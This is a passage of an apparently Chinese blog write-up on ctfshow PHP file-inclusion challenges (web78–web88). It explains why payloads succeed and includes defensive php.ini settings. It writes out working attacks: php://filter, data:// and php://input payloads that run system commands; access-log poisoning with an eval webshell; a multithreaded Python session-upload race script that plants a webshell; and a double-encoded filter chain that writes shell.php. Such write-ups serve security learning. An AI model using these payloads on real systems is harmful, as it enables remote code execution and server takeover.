class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>1.&#x2F;?file&#x3D;..&#x2F;..&#x2F;flag.php 报错的原因:</strong></p><p> <em><strong>Warning</strong>:  include(&#x2F;…&#x2F;www&#x2F;html&#x2F;index.php): failed to open stream: No such file or directory in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</strong> on line <strong>17</strong></em></p><p> <em><strong>Warning</strong>:  include(): Failed opening ‘&#x2F;…&#x2F;www&#x2F;html&#x2F;index.php’ for inclusion (include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php’) in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</strong> on line <strong>17</strong></em></p><p><strong>路径问题</strong>：..&#x2F;..&#x2F;flag.php 是相对路径，表示”向上两级目录中的flag.php”</p><p><strong>安全机制</strong>：PHP的 open_basedir 限制会阻止访问系统文件（常见于CTF环境）</p><p><strong>路径转换</strong>：PHP将相对路径转为绝对路径时，超出允许范围的路径会被替换为 &#x2F;…&#x2F;（安全占位符）</p><p><strong>根本原因</strong>：实际路径可能是 &#x2F;var&#x2F;www&#x2F;..&#x2F;..&#x2F;flag.php → 解析为 &#x2F;flag.php（根目录），而服务器禁止访问根目录</p><p><strong>关键点</strong>：这不是文件不存在，而是路径被安全机制拦截</p><p><strong>2.&#x2F;?file&#x3D;flag.php 显示空白的原因:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// flag.php 实际内容</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;ctfshow&#123;...&#125;&quot;</span>;  <span class="hljs-comment">// 没有输出语句！</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>include机制</strong>：当包含 .php 文件时，PHP会执行其中的代码，而非显示源码</p><p><strong>执行而非读取</strong>：</p><p>​    include(“flag.php”) 会执行 $flag&#x3D;”…” 的赋值操作</p><p>​    但该文件没有 echo&#x2F;print 语句 → 无任何输出</p><p>​    赋值操作在内存中完成，浏览器不可见</p><p><strong>空白页面</strong> &#x3D; 包含成功 + 文件无输出内容</p><p><strong>3.?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php成功的原因：</strong></p><p><strong>绕过执行</strong>：</p><p>​    php:&#x2F;&#x2F;filter 将文件视为数据流而非代码</p><p>​    resource&#x3D;flag.php 指定读取目标文件</p><p><strong>编码转换</strong>：</p><p>​    convert.base64-encode 对文件内容进行Base64编码</p><p>​    将二进制数据转为纯ASCII字符（A-Z a-z 0-9 +&#x3D;）</p><p><strong>安全输出</strong>：</p><p>​    编码后的内容不包含 <?php ?> 等标签</p><p>​    PHP引擎将其视为普通文本而非代码 → 直接输出到页面</p><p><strong>最终结果</strong>：</p><p>​    页面显示Base64编码的源码：PD9waHAgJGZsYWc9ImN0ZnNob3d7…</p><p>​    解码后得到原始代码</p><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p><em>$file &#x3D; str_replace(“php”, “???”, $file);</em> </p><p>改用base64编码php即可(没有&#x2F;i可以用大小写绕过)</p><p>获取flag： ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p><em>$file &#x3D; str_replace(“php”, “???”, $file);   $file &#x3D; str_replace(“data”, “???”, $file);</em> </p><p>用input协议，?file&#x3D;Php:&#x2F;&#x2F;input，抓post包，把post改成php语句即可运行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>也可以直接大小写绕过</p><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>可以不用伪协议，开始写马</p><p>在响应头的server中看见服务器为nginx，包含 nginx 访问日志记录：<strong>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong></p><p>Apache 默认的 combined 日志格式会 原样记录 User-Agent 字符串，不会进行 URL 解码或过滤特殊字符。所以我们改UA。直接添加<?php eval($_GET[2]);?></p><p>get改成**?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&amp;2&#x3D;system(‘tac fl0g.php’);**抓个get包，复制第一行替换原日志第一行即可获得flag</p><h3 id="web82-条件竞争"><a href="#web82-条件竞争" class="headerlink" title="web82(条件竞争)"></a>web82(条件竞争)</h3><p>过滤了.</p><p>php中唯一能控制的无后缀的只有session文件</p><p><img src="/%5Cimages%5Cweb82-1.png"></p><p>如果从cookie里添加PHPSESSID，值为aaa，临时目录下会生成文件**&#x2F;tmp&#x2F;sess_aaa**。</p><p>控制文件内容用参数<strong>PHP_SESSION_UPLOAD_PROGRESS</strong>(获取实时文件上传进度)</p><p>如PHP_SESSION_UPLOAD_PROGRESS&#x3D;”3” &#x3D;&gt; sess_aaa&#x3D;3</p><p><strong>file_put_contents() 函数</strong>：</p><ul><li>这是PHP的一个内置函数</li><li>作用：将内容写入文件（类似保存文件的操作）</li><li>语法：<code>file_put_contents(文件名, 要写入的内容)</code></li><li>示例：<code>file_put_contents(&#39;test.txt&#39;, &#39;Hello World&#39;)</code> 会创建一个test.txt文件，内容为”Hello World”</li></ul><p>写脚本（<strong>已经考虑到了先销毁再包含的情况）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 用于发送HTTP请求</span><br><span class="hljs-keyword">import</span> threading  <span class="hljs-comment"># 用于多线程操作</span><br><span class="hljs-keyword">import</span> io  <span class="hljs-comment"># 用于创建内存中的文件对象</span><br><br>url = <span class="hljs-string">&quot;http://e49655b6-8783-497c-a049-8daf3c8e02dc.challenge.ctf.show/&quot;</span><br>sessionid = <span class="hljs-string">&#x27;ctfshow&#x27;</span><br>data = &#123; <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br><span class="hljs-comment"># read()中需要post的内容</span><br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    fileBytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res = session.post(url,<br>            data=&#123;<br>            <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br>        <span class="hljs-comment"># 改参数的值就是/tmp/sess_rikka文件的内容</span><br>            &#125;,<br>            cookies=&#123;<br>            <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid<br>            &#125;,<br>            files=&#123;<br>            <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;ctfshow.jpg&#x27;</span>, fileBytes)<br>            &#125;<br>            )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res1 = session.post(url + <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessionid, data=data, cookies=&#123; <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid &#125;)<br>        res2 = session.get(url+<span class="hljs-string">&#x27;2.php&#x27;</span>)<br>        <span class="hljs-keyword">if</span> res2.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++done+++&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res2.status_code)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    event = threading.Event() <span class="hljs-comment"># 开启多线程的对象</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>): <span class="hljs-comment"># 开5个线程</span><br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br>    event.<span class="hljs-built_in">set</span>()<br><br></code></pre></td></tr></table></figure><p>50KB文件确保上传时间足够长（约几秒），这样攻击者有时间在文件被清空前利用它 </p><p>结果是+++done+++，说明成功，访问&#x2F;2.php，</p><p><img src="/%5Cimages%5Cweb82-2.png"></p><p>尝试post</p><p><img src="/%5Cimages%5Cweb82-3.png"></p><p>成功。下面详细讲解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 用于发送HTTP请求</span><br><span class="hljs-keyword">import</span> threading  <span class="hljs-comment"># 用于多线程操作</span><br><span class="hljs-keyword">import</span> io  <span class="hljs-comment"># 用于创建内存中的文件对象</span><br><br><span class="hljs-comment"># 目标网站的URL</span><br>url = <span class="hljs-string">&quot;http://e49655b6-8783-497c-a049-8daf3c8e02dc.challenge.ctf.show/&quot;</span><br><br><span class="hljs-comment"># 自定义的Session ID，用于控制Session文件名</span><br>sessionid = <span class="hljs-string">&#x27;ctfshow&#x27;</span><br><br><span class="hljs-comment"># 要执行的恶意PHP代码</span><br>data = &#123;<br>    <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>data 解释</strong>：</p><ul><li><code>&quot;1&quot;</code>：这是POST参数名</li><li>值是一个PHP代码字符串：<code>file_put_contents(&#39;/var/www/html/2.php&#39;,&#39;&lt;?php eval($_POST[2]);?&gt;&#39;);</code></li><li>这行代码的意思是：在服务器的<code>/var/www/html/</code>目录创建<code>2.php</code>文件</li><li>文件内容：<code>&lt;?php eval($_POST[2]);?&gt;</code>（这是一个Webshell）</li><li><code>eval($_POST[2])</code> 表示执行通过POST参数<code>2</code>发送的任何PHP代码</li></ul><hr><h4 id="写线程函数（负责污染Session文件）"><a href="#写线程函数（负责污染Session文件）" class="headerlink" title="写线程函数（负责污染Session文件）"></a>写线程函数（负责污染Session文件）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-comment"># 创建一个50KB大小的&quot;假文件&quot;（内容全是字母a）</span><br>    fileBytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># 无限循环</span><br>        <span class="hljs-comment"># 发送POST请求上传文件</span><br>        res = session.post(<br>            url,  <span class="hljs-comment"># 目标URL</span><br>            <br>            <span class="hljs-comment"># POST数据部分</span><br>            data=&#123;<br>                <span class="hljs-comment"># 关键！这个值会被写入Session文件</span><br>                <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br>            &#125;,<br>            <br>            <span class="hljs-comment"># Cookie设置</span><br>            cookies=&#123;<br>                <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid  <span class="hljs-comment"># 设置Session ID</span><br>            &#125;,<br>            <br>            <span class="hljs-comment"># 上传的文件</span><br>            files=&#123;<br>                <span class="hljs-comment"># 文件字段名：&#x27;file&#x27;</span><br>                <span class="hljs-comment"># 文件名：&#x27;ctfshow.jpg&#x27;</span><br>                <span class="hljs-comment"># 文件内容：50KB的&#x27;a&#x27;</span><br>                <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;ctfshow.jpg&#x27;</span>, fileBytes)<br>            &#125;<br>        )<br></code></pre></td></tr></table></figure><p><strong>为什么需要大文件？</strong></p><ul><li>PHP只在上传过程中保持Session文件打开</li><li>50KB文件确保上传时间足够长（约几秒）</li><li>这样攻击者有时间在文件被清空前利用它</li></ul><p><strong>Session文件如何被污染？</strong></p><ol><li>设置Cookie: <code>PHPSESSID=ctfshow</code></li><li>开始上传文件</li><li>PHP自动创建文件：<code>/tmp/sess_ctfshow</code></li><li>将<code>PHP_SESSION_UPLOAD_PROGRESS</code>的值写入该文件</li><li>文件内容变为：<code>upload_progress_&lt;?php eval($_POST[1]);?&gt;</code></li></ol><hr><h4 id="读线程函数（负责执行恶意代码）"><a href="#读线程函数（负责执行恶意代码）" class="headerlink" title="读线程函数（负责执行恶意代码）"></a>读线程函数（负责执行恶意代码）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># 无限循环</span><br>        <span class="hljs-comment"># 第一步：触发文件包含漏洞执行恶意代码</span><br>        res1 = session.post(<br>            <span class="hljs-comment"># 利用文件包含漏洞：?file=/tmp/sess_ctfshow</span><br>            url + <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessionid,<br>            <br>            <span class="hljs-comment"># 发送要执行的代码</span><br>            data=data,  <span class="hljs-comment"># 就是前面定义的创建Webshell的代码</span><br>            <br>            cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid&#125;  <span class="hljs-comment"># 保持同一个Session</span><br>        )<br>        <br>        <span class="hljs-comment"># 第二步：检查Webshell是否创建成功</span><br> <br>        res2 = session.get(url + <span class="hljs-string">&#x27;2.php&#x27;</span>)<br>        <br>        <span class="hljs-comment"># 如果返回200状态码，说明文件存在</span><br>        <span class="hljs-keyword">if</span> res2.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++done+++&quot;</span>)  <span class="hljs-comment"># 成功提示</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res2.status_code)  <span class="hljs-comment"># 打印错误代码</span><br></code></pre></td></tr></table></figure><p><strong>攻击链解析</strong>：</p><ol><li>请求包含Session文件：<code>?file=/tmp/sess_ctfshow</code></li><li>服务器执行该文件中的PHP代码：<code>eval($_POST[1])</code></li><li><code>$_POST[1]</code>的值是我们发送的：<code>file_put_contents(...)</code></li><li>所以实际执行：<code>file_put_contents(&#39;/var/www/html/2.php&#39;, &#39;&lt;?php eval($_POST[2]);?&gt;&#39;)</code></li><li>在网站根目录创建<code>2.php</code>，内容为Webshell代码</li></ol><hr><h4 id="多线程主程序"><a href="#多线程主程序" class="headerlink" title="多线程主程序"></a>多线程主程序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    event = threading.Event()  <span class="hljs-comment"># 线程事件对象（实际未使用）</span><br>    <br>    <span class="hljs-comment"># 创建持久会话（自动管理cookies）</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-comment"># 启动5个写线程</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <br>        <span class="hljs-comment"># 启动5个读线程</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br>    <br>    event.<span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 设置事件（实际未使用）</span><br></code></pre></td></tr></table></figure><p><strong>为什么需要多线程？</strong>（<strong>就算先删除临时目录再包含，也可以写进去shell</strong>)</p><ol><li><strong>竞争条件</strong>：Session文件在上传结束后会被PHP清空</li><li>写线程不断创建&#x2F;更新Session文件</li><li>读线程不断尝试在文件被清空前包含它</li><li>多个线程增加成功率（类似不断尝试开锁）</li></ol><hr><h3 id="Webshell使用示例"><a href="#Webshell使用示例" class="headerlink" title="Webshell使用示例"></a>Webshell使用示例</h3><p>成功创建<code>2.php</code>后，攻击者可以发送：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/2.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>目标网站<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-ini"><span class="hljs-attr">2</span>=system(<span class="hljs-string">&quot;ls -la /&quot;</span>)<span class="hljs-comment">;</span></span><br></code></pre></td></tr></table></figure><p><strong>结果</strong>：</p><ul><li>服务器会执行<code>ls -la /</code>（列出根目录所有文件）</li><li>返回结果给攻击者</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br>...<br>total 123<br>drwxr-xr-x  1 root root   4096 Jun 14 12:34 .<br>drwxr-xr-x  1 root root   4096 Jun 14 12:34 ..<br>-rw-r--r--  1 root root    148 Aug 17  2022 .bashrc<br>...<br></code></pre></td></tr></table></figure><hr><h3 id="为什么这个攻击有效？"><a href="#为什么这个攻击有效？" class="headerlink" title="为什么这个攻击有效？"></a>为什么这个攻击有效？</h3><ol><li><p><strong>Session文件可控</strong>：</p><ul><li>唯一无需后缀即可写入PHP代码的地方</li><li>通过<code>PHP_SESSION_UPLOAD_PROGRESS</code>控制内容</li></ul></li><li><p><strong>文件包含漏洞</strong>：</p><ul><li>网站有类似<code>include($_GET[&#39;file&#39;])</code>的代码</li><li>允许读取<code>/tmp/sess_xxx</code>文件</li></ul></li><li><p><strong>时间窗口利用</strong>：</p><ul><li>大文件上传延长Session文件存在时间</li><li>多线程不断尝试利用这个时间窗口</li></ul></li></ol><hr><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ol><li><p>关闭危险功能：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; php.ini 配置</span><br><span class="hljs-attr">session.upload_progress.enabled</span> = <span class="hljs-literal">Off</span><br></code></pre></td></tr></table></figure></li><li><p>限制文件包含：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不要直接包含用户输入</span><br><span class="hljs-variable">$allowed</span> = [<span class="hljs-string">&#x27;header.php&#x27;</span>, <span class="hljs-string">&#x27;footer.php&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>], <span class="hljs-variable">$allowed</span>)) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>设置open_basedir：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; 限制PHP可访问的目录</span><br><span class="hljs-attr">open_basedir</span> = /var/www/html:/tmp<br></code></pre></td></tr></table></figure></li><li><p>Session文件隔离：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; 为每个用户设置独立Session目录</span><br><span class="hljs-attr">session.save_path</span> = <span class="hljs-string">&quot;/var/lib/php/sessions&quot;</span><br></code></pre></td></tr></table></figure></li></ol><p>这个攻击利用了PHP的多个特性和配置默认值，通过精心构造的请求在服务器上创建后门。理解每个步骤对于防御此类攻击至关重要。</p><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p>需要用GET传入一个参数file和用POST传入一个参数content，后面是对file参数内容的过滤</p><p>file_put_contents(urldecode($file), “<?php die(‘大佬别秀了’);?>”.$content);</p><ul><li>使用<code>file_put_contents</code>函数将字符串写入到由<code>$file</code>指定的文件中。在写入之前，<code>$file</code>经过了<code>urldecode</code>函数处理，这意味着如果文件名是URL编码的，它会被解码。写入的内容首先是<code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code>，这是一个PHP脚本，当文件被作为PHP执行时会立即终止执行并显示消息”大佬别秀了”。然后是变量<code>$content</code>的值。</li></ul><p>那么 file_put_contents 函数，将会往 $file 里写入 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 和我们 post 传入的 $content 内容。</p><p>这时候我们可以想到file参数被过滤了很多东西，所以我们可以在content参数中传入一句话木马，但由于会同时写入一个die指令，这时候就需要我们去绕过这个死亡函数了</p><p>由于这里 url 传入的内容本身会进行一次 url 解码，题目中还使用了一个 urldecode 函数，因此 file 传入的内容需要先经过两次 url 编码再传入。</p><p>content是写入内容,要进行base64编码  对应上面的伪协议解码,而base解码时,是4个一组,flag.php(要写入的文件),写入的内容中只有phpdie会参与base64解码,因为phpdie只有6个字节,补两个a就是8字节了）（aaPD9waHAgc3lzdGVtKCdscycpOz8+）11是补给前面的 （结果就是phpdie11PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;（四个一组））</p><p>file 传入 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;shell.php</p><p>进行二次编码后得到:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?<span class="hljs-keyword">file</span>=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30<br></code></pre></td></tr></table></figure><p>对 webshell 进行 base64 编码：</p><p>webshell：<code>&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;</code></p><p>编码后得到:<br>PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;</p><p>注意我们还需要加两个合法字符让前面 base64 解码成功，这里多传入两个1。</p><p>post 传入：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">content</span><span class="hljs-operator">=</span><span class="hljs-number">11</span>PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg<span class="hljs-operator">=</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>然后调用shell.php，传入cmd</p><p><img src="/%5Cimages%5Cweb87.png"></p><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; 